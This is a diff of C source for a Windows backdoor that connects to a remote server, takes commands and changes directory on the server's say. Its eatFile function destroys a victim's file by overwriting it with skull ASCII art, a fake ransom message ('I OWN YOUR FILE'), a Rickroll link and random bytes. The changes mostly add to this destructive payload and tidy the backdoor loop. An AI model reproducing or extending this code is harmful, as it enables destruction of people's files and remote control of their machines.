@@ -14,7 +14,8 @@ WSADATA wsa;
 SOCKET s;
 struct sockaddr_in server;
 char buffer[2048];
-int recv_size, awaamiErrorCode;
+int recv_size;
+int awaamiErrorCode;
 
 // Repetitive code declared as functions here...
 
@@ -151,9 +152,38 @@ int eatFile(char fileName[]) {
 
     filein = fopen(fileName, "w");
 
-	fputs("=========================================\n", filein);
-	fputs("THIS IS SNAKE POOP NOW\n", filein);
-	fputs("=========================================\n\n", filein);
+	
+	fputs("         _______________\n", filein);
+	fputs("        /               \\\n", filein);
+	fputs("       /                 \\\n", filein);
+	fputs("      /                   \\\n", filein);
+	fputs("      |   XXXX     XXXX   |\n", filein);
+	fputs("      |   XXXX     XXXX   |\n", filein);
+	fputs("      |   XXX       XXX   |\n", filein);
+	fputs("      |         X         |\n", filein);
+	fputs("      \\__      XXX     __/\n", filein);
+	fputs("        |\\     XXX     /|\n", filein);
+	fputs("        | |           | |\n", filein);
+	fputs("        | I I I I I I I |\n", filein);
+	fputs("        |  I I I I I I  |\n", filein);
+	fputs("         \\_           _/\n", filein);
+	fputs("          \\_         _/\n", filein);
+	fputs("            \\_______/\n", filein);
+	fputs("  XXX                        XXX\n", filein);
+	fputs("XXXXX                        XXXXX\n", filein);
+	fputs(" XXXXXXXXXX             XXXXXXXXXX\n", filein);
+	fputs("         XXXXX     XXXXX\n", filein);
+	fputs("             XXXXXXX\n", filein);
+	fputs("         XXXXX     XXXXX\n", filein);
+	fputs(" XXXXXXXXXX             XXXXXXXXXX\n", filein);
+	fputs("XXXXX                        XXXXX\n", filein);
+	fputs("  XXX                        XXX\n\n", filein);
+
+
+	fputs("=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/\n", filein);
+	fputs("			I OWN YOUR FILE.\n			WATCH THE VIDEO TO GET IT BACK.\n", filein);
+	fputs("=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/\n\n", filein);
+	fputs("https://www.youtube.com/watch?v=dQw4w9WgXcQ\n\n", filein);
 
     for (int i = 0; i < n; i++) {
         fputc(rand() % 256, filein);
@@ -184,6 +214,7 @@ int backdoor_main()
 		}
 
 		fprintf(stderr, "\n\n[+] Connected\n");
+		
 		while (connected) {
 			
 			// Getting chosen option by server
@@ -227,7 +258,6 @@ int backdoor_main()
 							awaamiErrorCode = reliableRecieve();
 						}
 
-						fprintf(stderr, "\nbuffer reads: %s", buffer);
 						chdir(buffer);
 
 						// Sending updated CWD
@@ -283,6 +313,7 @@ int backdoor_main()
 				break;
 			}
 		}
+		
 		fprintf(stderr, "\n\n[+] Disconnected...\n\n");
 	}
 
